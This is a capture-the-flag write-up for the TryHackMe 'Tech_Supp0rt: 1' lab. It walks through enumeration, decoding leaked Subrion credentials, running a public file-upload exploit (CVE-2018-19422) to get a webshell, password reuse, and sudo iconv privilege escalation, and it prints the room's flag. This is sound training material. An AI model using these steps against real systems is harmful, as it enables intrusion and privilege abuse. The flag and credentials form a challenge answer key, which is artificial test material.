---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
---

# Tech_Supp0rt: 1
![Tech_Supp0rt: 1 logo](logos/tech_supp0rt_1_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Tech_Supp0rt: 1](https://tryhackme.com/room/techsupp0rt1)  

## Description
"Hack into the scammer's under-development website to foil their plans.

Hack into the machine and investigate the target.

**Note:** The theme and security warnings encountered in this room are part of the challenge."

## Enumeration
### Port Scanning
```bash
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```
```
Host is up (0.020s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.8 - 3.16 (96%), Linux 3.10 - 3.13 (96%), Linux 3.13 (96%), Linux 4.4 (96%), Linux 5.4 (96%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 6.0 - 9.0 (Linux 3.18 - 4.4) (92%), Android 7.1.1 - 7.1.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -1h50m00s, deviation: 3h10m32s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-11-07T16:21:24
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2026-11-07T21:51:23+05:30
```
### HTTP Enumeration (80)
```bash
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
```
**Notes**  
- Home page is default Apache page  
- No `robots.txt` or `sitemap` files  
- Nothing interesting in source code  
- `ffuf` discovers `wordpress` and `test` directories  
- `wordpress` site contains default pages
- `test` site contains security warning page mentioned in page description
#### Wordpress enumeration
```bash
wpscan --url http://<TARGET_IP_ADDRESS>/wordpress/
```
```
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://<TARGET_IP_ADDRESS>/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://<TARGET_IP_ADDRESS>/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://<TARGET_IP_ADDRESS>/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://<TARGET_IP_ADDRESS>/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://<TARGET_IP_ADDRESS>/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://<TARGET_IP_ADDRESS>/wordpress/, Match: 'WordPress 5.7.2'

[+] WordPress theme in use: teczilla
 | Location: http://<TARGET_IP_ADDRESS>/wordpress/wp-content/themes/teczilla/
 | Last Updated: 2023-07-29 4:00am GMT (3 years ago, per WordPress.org)
 | Active Installs: 200 (per WordPress.org)
 | Readme: http://<TARGET_IP_ADDRESS>/wordpress/wp-content/themes/teczilla/readme.txt
 | [!] The version is out of date, the latest version is 1.1.5
 | Style URL: http://<TARGET_IP_ADDRESS>/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2
 | Style Name: Teczilla
 | Style URI: https://www.avadantathemes.com/product/teczilla-free/
 | Description: Teczilla is a creative, fully customizable and multipurpose theme that you can use to create any kin...
 | Author: avadantathemes
 | Author URI: https://www.avadantathemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://<TARGET_IP_ADDRESS>/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2, Match: 'Version: 1.0.4'
```
**Notes**  
Entering incorrect username in `/wordpress/wp-admin` page results in confirmation that username does not exist. Using discovered user name (`support`) confirms incorrect password for valid user.
### SMB Enumeration (445)
```bash
smbclient -N -L \\\\10.129.135.81          

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        websvr          Disk      
        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

smbclient -N \\\\10.129.135.81\\websvr
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat May 29 03:17:38 2021
  ..                                  D        0  Sat May 29 03:03:47 2021
  enter.txt                           N      273  Sat May 29 03:17:38 2021

                8460484 blocks of size 1024. 5650120 blocks available
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)

cat enter.txt           
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->       
```
**Notes**  
- Discovered password can be decoded in CyberChef with recipe: From Base58 > From Base32 > From Base64 to "Scam2021"  
- Navigating too `/subrion` endpoint redirects to `http://10.0.2.15/subrion/subrion` and fails
  
### Vulnerability Enumeration
```bash
searchsploit OpenSSH 7.2p2	# Only results are username enumeration and DoS
searchsploit httpd 2.4.18	# Only result DoS
searchsplot smbd 4.3.11		# No results

```
## Initial Foothold
**Notes**  
- Navigating too `/subrion` endpoint redirects to `http://10.0.2.15/subrion/subrion` and fails  
- Using clue from `enter.txt`, navigating to `/subrion/panel` returns an admin panel  
- Login successful with discovered (decoded) credentials  
- `/subrion` version confirmed as `4.2.1`  
```bash
searchsploit subrion                               
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Subrion 3.x - Multiple Vulnerabilities                                                                                    | php/webapps/38525.txt
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                                                                   | php/webapps/47469.txt
Subrion Auto Classifieds - Persistent Cross-Site Scripting                                                                | php/webapps/14391.txt
SUBRION CMS - Multiple Vulnerabilities                                                                                    | php/webapps/17390.txt
Subrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                                                                | php/webapps/21267.txt
subrion CMS 2.2.1 - Multiple Vulnerabilities                                                                              | php/webapps/22159.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                                                                | php/webapps/47851.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Scripting                                   | php/webapps/40553.txt
Subrion CMS 4.0.5 - SQL Injection                                                                                         | php/webapps/40202.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                                                                    | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                                                                 | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                                                          | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                                                                  | php/webapps/45150.txt
Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                                                                     | php/webapps/51110.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------

searchsploit -m 49876

python3 -u http://<TARGET_IP_ADDRESS>/subrion/panel/ -l admin -p Scam2021
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.130.147.22/subrion/panel/
[+] Success!
[+] Got CSRF token: Kfg3op3ILkOKpKIj6Rg4Br4Y8zsTriSuDx4GwQnP
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: ttzkxecmcerqssz

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.130.147.22/subrion/panel/uploads/ttzkxecmcerqssz.phar 

$ whoami
www-data
```
**Notes**  
- Enumerating local file system finds local user `scamsite`  
- Enumerating local file system finds password for a support user
```bash
$ cat /var/www/html/wordpress/wp-config.php
<?php
/**
 * The base configuration for WordPress
<REDACTED FOR BREVITY>
/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
<REDACTED FOR BREVITY>
```
**Notes**  
- Attempting to use `support`:`ImAScammerLOL!123!` with `ssh` fails  
- Attempting password reuse with known local user `scamsite` is successful  

## Privilege escalation
```bash
sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```
[GTFOBins entry](https://gtfobins.org/gtfobins/iconv/)
```bash
sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
```
??? success "What is the root.txt flag?"
	851b8233a8c09400ec30651bd1529bf1ed02790b

**Date completed:** 09/11/26  
**Date published:** 09/11/26